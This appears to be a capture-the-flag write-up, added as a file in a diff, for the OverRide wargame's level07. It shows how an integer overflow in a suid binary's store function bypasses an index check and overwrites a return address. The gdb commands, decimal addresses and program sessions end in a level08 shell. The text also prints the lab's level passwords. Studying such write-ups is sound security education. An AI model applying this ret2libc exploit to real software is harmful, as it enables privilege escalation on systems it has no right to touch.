@@ -1,0 +1,111 @@
+Authenticating as level07/GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+
+We come across a suid binary named level07.
+
+After analysing the binary, its prompting us with an input with 3 options [ read, store, quit ]
+
+It has 4 functions [ main, get_unum, read_number, store_number ]
+
+It gets interesting when we try to store a number in the selected memory area, in which the function
+store_number has an integer overflow vulnerability
+
+
+We will try to exploit it and use ret2libc method to execute a shell.
+
+First let's try to get the resources we need, The address of "/bin/sh" in the libc.
+(gdb) info proc map
+process 1685
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fda000 0xf7fdb000     0x1000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fcf100, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+
+Now we need the address of system@ptl function
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+All we have to do now is to figure out how to exploit the function store_number to overwrite the rip register.
+
+The only problem here is the function has some kind of protection that doesn't allow the user to write on some addresses using %3
+  if ((index % 3 == 0) || (number >> 24 == 183)) {
+    puts(" *** ERROR! ***");
+    puts("   This index is reserved for wil!");
+    puts(" *** ERROR! ***");
+    ret = 1;
+  }
+
+We can easily bypass this check by using integer overlap to bypass the check and then (index * 4) will give us the right index to store what we need.
+For example if we entered 2147483648 as index the results of (index * 4) will give us 0 so we will be able to write in the index 0 of the array.
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 23
+ Index: 2147483648
+ Completed store command successfully
+Input command: read
+ Index: 0
+ Number at data[0] is 23
+ Completed read  command successfully
+Input command:
+
+All I need to now is to convert those address to decimal and write them using store option.
+
+4159090384 system@ptl at index 114
+4160264172 "/bin/sh"  at index 116
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 2147483764
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$
